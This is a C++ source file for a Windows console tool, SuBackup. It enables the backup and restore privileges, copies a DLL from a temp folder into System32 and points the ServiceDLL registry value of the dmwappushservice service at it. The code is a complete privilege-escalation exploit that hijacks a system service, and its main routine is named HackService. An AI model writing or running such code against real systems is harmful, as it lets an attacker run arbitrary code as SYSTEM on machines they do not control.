// SuBackup.cpp : definisce il punto di ingresso dell'applicazione console.
//

#include "stdafx.h"


#include <Windows.h>
#include <Ntsecapi.h>
#include <sddl.h>
#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <stdio.h>
#include <string>
#include <tchar.h>
#include <AclAPI.h>
#pragma comment(lib, "secur32.lib")

#define STATUS_SUCCESS           0

#define FSIZE 11777



int HackService();
BOOL SetPrivilege(
	_In_ HANDLE hToken,
	_In_z_ LPCTSTR lpszPrivilege,
	_In_ BOOL bEnablePrivilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,             // lookup privilege on local system
		lpszPrivilege,    // privilege to lookup 
		&luid))           // receives LUID of privilege
	{
		fprintf(stderr, "LookupPrivilegeValue failed (error: %u).\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	//
	// Enable the privilege or disable all privileges.
	//
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		fprintf(stderr, "AdjustTokenPrivileges failed (error: %u).\n", GetLastError());
		return FALSE;
	}
	else
	{
		if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
		{
			fprintf(stderr, "The token does not have the specified privilege (%S).\n", lpszPrivilege);
			return FALSE;
		}
		else
		{
			printf("AdjustTokenPrivileges (%S): OK\n", lpszPrivilege);
		}
	}

	return TRUE;
}
int main(int argc, char **argv)
{
	
	HANDLE hProcess = GetCurrentProcess();
	HANDLE hToken;
	OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	if (!SetPrivilege(hToken, SE_BACKUP_NAME, TRUE))
	{
		exit(EXIT_FAILURE);
	}
	if (!SetPrivilege(hToken, SE_RESTORE_NAME, TRUE))
	{
		exit(EXIT_FAILURE);
	}


	HackService();
}

int HackService()
{
	HANDLE dest, source;
	HKEY hk;
	char buf[FSIZE + 1];
	DWORD bytesread, byteswritten;
	LPCWSTR fnamein = L"c:\\temp\\servicedll.dll";
	LPCWSTR fnameout = L"c:\\windows\\system32\\servicedll.dll";
	std::string data = "c:\\windows\\system32\\servicedll.dll";
	source = CreateFile(fnamein, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (source == INVALID_HANDLE_VALUE) {
		printf("Error, source file not opened.");
		exit(EXIT_FAILURE);
	}


	dest = CreateFile(fnameout,
				GENERIC_WRITE, 
				FILE_SHARE_WRITE, 
				NULL, 
				CREATE_ALWAYS, 
				FILE_FLAG_BACKUP_SEMANTICS,
		    	NULL);
	if (dest == INVALID_HANDLE_VALUE) {

		printf("Could not open %s file, error %d\n", fnameout, GetLastError());
	    exit(EXIT_FAILURE);
	}
	
	ReadFile(source, buf, FSIZE, &bytesread, NULL);
	printf("Read bytes from source dll: %d\n", bytesread);
	WriteFile(dest, buf, bytesread, &byteswritten, NULL);
	CloseHandle(dest);
	CloseHandle(source);
	printf("Bytes written to dest servicedll %d\n", byteswritten);

	LSTATUS stat = RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		"SYSTEM\\CurrentControlSet\\Services\\dmwappushservice\\Parameters",
		0,
		NULL,
		REG_OPTION_BACKUP_RESTORE,
		KEY_SET_VALUE,
		NULL,
		&hk,
		NULL);
	stat = RegSetValueExA(hk, "ServiceDLL", 0, REG_EXPAND_SZ, (const BYTE*)data.c_str(), data.length() + 1);
	if (stat != ERROR_SUCCESS) {
		printf("[-] Failed writing!", stat);
		exit(EXIT_FAILURE);
	}
	printf("Setting registry OK\n");
	return 1;
}
